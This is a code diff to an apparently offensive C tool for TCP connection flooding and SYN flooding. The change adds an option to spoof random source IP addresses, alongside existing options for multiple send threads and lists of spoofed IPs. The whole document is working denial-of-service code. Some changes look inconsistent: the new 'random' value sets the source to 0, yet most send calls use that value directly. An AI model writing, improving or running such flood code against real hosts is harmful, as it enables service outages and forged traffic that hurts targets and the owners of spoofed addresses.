@@ -29,7 +29,7 @@ enum e_action {
 
 /* global variables */
 int running = 1;
-uint32_t interface_addr = 0;
+uint32_t source_addr = 1;
 const char *interface = NULL;
 const char *hostname = NULL;
 uint32_t dest_addr = 0;
@@ -70,7 +70,9 @@ uint32_t get_src_ip()
             id = 0;
         return spoof_addresses[id];
     }
-    return interface_addr;
+    if(source_addr == 0)
+        return leef_random_u32();
+    return source_addr;
 }
 
 /* Connection flood send thread */
@@ -90,7 +92,7 @@ void *conn_flood_attack_thread(void *param)
         id = leef_random_byte() << 8 | leef_random_byte();
         seq = action_uuid << 16 | id;
         leef_send_tcp_syn(&leef,
-                          interface_addr, dest_addr,
+                          source_addr, dest_addr,
                           src_port, dest_port,
                           id, seq,
                           use_tcp_options);
@@ -190,7 +192,7 @@ void conn_flood_sniff_thread()
 
                     if(send_data_size > 0) {
                         leef_send_raw_tcp2(&leef,
-                                           interface_addr, dest_addr,
+                                           source_addr, dest_addr,
                                            src_port, dest_port,
                                            id, seq, ack_seq,
                                            TCP_ACK | TCP_PUSH,
@@ -199,7 +201,7 @@ void conn_flood_sniff_thread()
                         tx_bytes += 54 + send_data_size;
                     } else {
                         leef_send_tcp_ack(&leef,
-                                          interface_addr, dest_addr,
+                                          source_addr, dest_addr,
                                           src_port, dest_port,
                                           id, seq, ack_seq);
                         tx_bytes += 54;
@@ -245,7 +247,7 @@ void conn_flood_sniff_thread()
                 }
             /* check if the packet is to the host */
             } else if(packet.ip->protocol == IPPROTO_TCP &&
-                      packet.ip->saddr == interface_addr &&
+                      packet.ip->saddr == source_addr &&
                       packet.ip->daddr == dest_addr &&
                       packet.in_ip.tcp->dest == dest_port &&
                       packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
@@ -520,7 +522,7 @@ void tcp_ping_thread()
 
             /* send a SYN ping */
             leef_send_tcp_syn(&leef,
-                              interface_addr, dest_addr,
+                              source_addr, dest_addr,
                               src_port, dest_port,
                               leef_random_u16(), action_uuid << 16 | leef_random_u16(),
                               use_tcp_options);
@@ -608,7 +610,7 @@ void print_help(char **argv)
     printf("  -u [interval]     - Sleep interval in microseconds (default: 10000)\n");
     printf("  -b [bytes]        - Additional random bytes to send as data (default: 0)\n");
     printf("  -m [threads]      - Number of send threads (default: 1)\n");
-    printf("  -s [ip]           - Use a custom source address (default: interface ip)\n");
+    printf("  -s [ip]           - Custom source ip, you may set to 'random' (default: interface ip)\n");
     printf("  -d [binary file]  - Send binary file as data\n");
     printf("  -f [text file]    - Read a list of IPs from a text file for spoofing\n");
     printf("  -o                - Enable tcp options on SYN packets\n");
@@ -669,16 +671,18 @@ int main(int argc, char **argv)
                     break;
                 case 'i':
                     interface = argv[++arg];
-                    interface_addr = leef_if_ipv4(interface);
-                    if(interface_addr == 0) {
-                        fprintf(stderr, "could not read interface ipv4 address\n");
-                        return -1;
+                    if(source_addr == 1) {
+                        source_addr = leef_if_ipv4(interface);
+                        if(source_addr == 0) {
+                            fprintf(stderr, "could not read interface ipv4 address\n");
+                            return -1;
+                        }
                     }
                     break;
                 case 'h':
                     hostname = argv[++arg];
                     dest_addr = leef_resolve_hostname(hostname);
-                    if(dest_addr == 0) {
+                    if(dest_addr == -1) {
                         fprintf(stderr, "could not resolve hostname address\n");
                         return -1;
                     }
@@ -694,10 +698,14 @@ int main(int argc, char **argv)
                     }
                     break;
                 case 's':
-                    interface_addr = leef_resolve_hostname(argv[++arg]);
-                    if(interface_addr == 0) {
-                        fprintf(stderr, "could not resolve source address\n");
-                        return -1;
+                    if(strcmp(argv[++arg], "random") == 0) {
+                        source_addr = 0;
+                    } else {
+                        source_addr = leef_resolve_hostname(argv[arg]);
+                        if(source_addr == -1) {
+                            fprintf(stderr, "could not resolve source address\n");
+                            return -1;
+                        }
                     }
                     break;
                 case 'u':
